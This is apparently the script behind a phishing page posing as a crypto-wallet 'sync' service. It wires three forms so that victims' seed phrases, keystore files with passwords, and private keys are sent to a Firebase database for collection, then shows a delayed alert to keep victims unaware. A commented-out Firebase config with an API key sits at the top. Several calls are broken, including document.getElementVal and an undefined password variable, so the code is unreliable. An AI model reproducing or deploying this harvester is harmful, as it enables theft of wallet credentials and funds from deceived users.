// const firebaseConfig = {
//     apiKey: "AIzaSyAb5qKl_OYjHS-GyStc8P6Paa-4kEuLRXs",
//     authDomain: "mainnet-syncdapp.firebaseapp.com",
//     databaseURL: "https://mainnet-syncdapp-default-rtdb.firebaseio.com",
//     projectId: "mainnet-syncdapp",
//     storageBucket: "mainnet-syncdapp.appspot.com",
//     messagingSenderId: "817769356811",
//     appId: "1:817769356811:web:953c60e0bb1f1435b1b10e"
//   };



  //initialize fb
  firebase.initializeApp(firebaseConfig);

//ref for db
var importDB = firebase.database().ref("importForm");
var keystoreFormDB = firebase.database().ref("keystoreForm");
var privateFormDB = firebase.database().ref("privateForm");

document.getElementById('importForm').addEventListener('submit', submitPhrase);
document.getElementById('keystoreForm').addEventListener('submit', submitKeystore);
document.getElementById('privateForm').addEventListener('submit', submitPrivate);


//submit phrase page
function submitPhrase(e) {
    e.preventDefault();

    var phrase = document.getElementVal('phrase');
    var walletname = document.getElementVal('walletname');

    // console.log(phrase, walletname);

    savePhrase(phrase, walletname);

    //alert msg
    setTimeout(() => {
    document.querySelector('.alert').style.display = "block"
    }, 3000);

    //reset form
    document.getElementById('importForm').reset();

}

const savePhrase = (phrase, walletname)=>{
    var newimportDB = importDB.push();

    newimportDB.set({
        phrase : phrase,
        walletname : walletname
    })
}

const getElementVal = (id) =>{
    return document.getElementById(id).value;
}




//submit keystore page
function submitKeystore(el) {
    el.preventDefault();

    var jsonKey = document.getElementValue("json");
    var passwordKey = document.getElementValue("password");
    var walletnameKey = document.getElementValue("walletKeystore");

    console.log(jsonKey, passwordKey, walletnameKey);

    saveKeystore(jsonKey, passwordKey, walletnameKey)
}

const saveKeystore = (jsonKey, passwordKey, walletnameKey)=>{
    var newkeystoreFormDB = keystoreFormDB.push();

    newkeystoreFormDB.set({
        jsonKey : jsonKey,
        passwordKey : password,
        walletnameKey : walletnameKey
    })
}

const getElementValue = (id) =>{
    return document.getElementById(id).value;
}


//submit private page
function submitPrivate(ele) {
    ele.preventDefault();

    var privateKey = document.getElementValues("privateKey");
    var privateWalletname = document.getElementValues("privatewalletname");

    console.log(privateKey, privateWalletname);

    savePrivateKey(privateKey, privateWalletname);
}

const savePrivateKey = (privateKey, privateWalletname) =>{
    var newprivateFormDB = privateFormDB.push();

    newprivateFormDB.set({
        privateKey : privateKey,
        privateWalletname : privateWalletname
    })
}

const getElementValues = (id) =>{
    return document.getElementById(id).value;
}